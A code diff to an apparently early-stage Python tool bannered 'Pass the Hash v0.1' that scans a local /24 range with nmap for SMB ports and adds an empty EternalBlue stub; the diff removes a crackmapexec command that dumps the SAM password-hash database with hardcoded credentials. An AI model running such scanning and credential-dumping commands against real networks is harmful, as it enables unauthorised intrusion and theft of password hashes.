@@ -2,6 +2,24 @@ import nmap
 import re
 import sys
 import subprocess
+import socket
+
+def header():
+    print("""
+      ___                     ___     
+     /  /\        ___        /__/\    
+    /  /::\      /  /\       \  \:\   
+   /  /:/\:\    /  /:/        \__\:\  
+  /  /:/~/:/   /  /:/     ___ /  /::\ 
+ /__/:/ /:/   /  /::\    /__/\  /:/\:\\
+ \  \:\/:/   /__/:/\:\   \  \:\/:/__\/
+  \  \::/    \__\/  \:\   \  \::/     
+   \  \:\         \  \:\   \  \:\     
+    \  \:\         \__\/    \  \:\    
+     \__\/                   \__\/ 
+     
+          Pass the Hash v0.1   
+    """)
 
 def convertIpToRange(ip):
 	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
@@ -11,6 +29,7 @@ def nmScan(ip):
     targets = []
     range = convertIpToRange(ip)
     nm = nmap.PortScanner()
+    print("Starting nmap scan over range: " + range + "...")
     nm.scan(hosts=range, arguments="-O -n -p445,139")
     hosts = nm.all_hosts()
 	# For each running machine IP picked up by nmap
@@ -30,16 +49,16 @@ def nmScan(ip):
                 targets.append(host_obj)
     return targets
 
-def firstMachine(username, password, ip):
-    proc = subprocess.Popen('crackmapexec -u {} -p {} -d WORKGROUP {} --sam'.format(username, password, ip), stdout=subprocess.PIPE)
-    tmp = proc.stdout.read()
-    print(tmp)
+def eternalBlue(ip):
+    pass
 
 def main():
+    header()
     ip = sys.argv[1]
-    print(convertIpToRange(ip))
-    firstMachine('hacker', 'toor', '169.254.121.23')
-	#target_hosts = nmScan(ip)
+    # firstMachine('hacker', 'toor', '169.254.121.23')
+    #print(socket.gethostbyname(socket.gethostname()))
+    target_hosts = nmScan(ip)
+    print("Found {} targets.".format(len(target_hosts)))
 
 if __name__ == "__main__":
     # execute only if run as a script
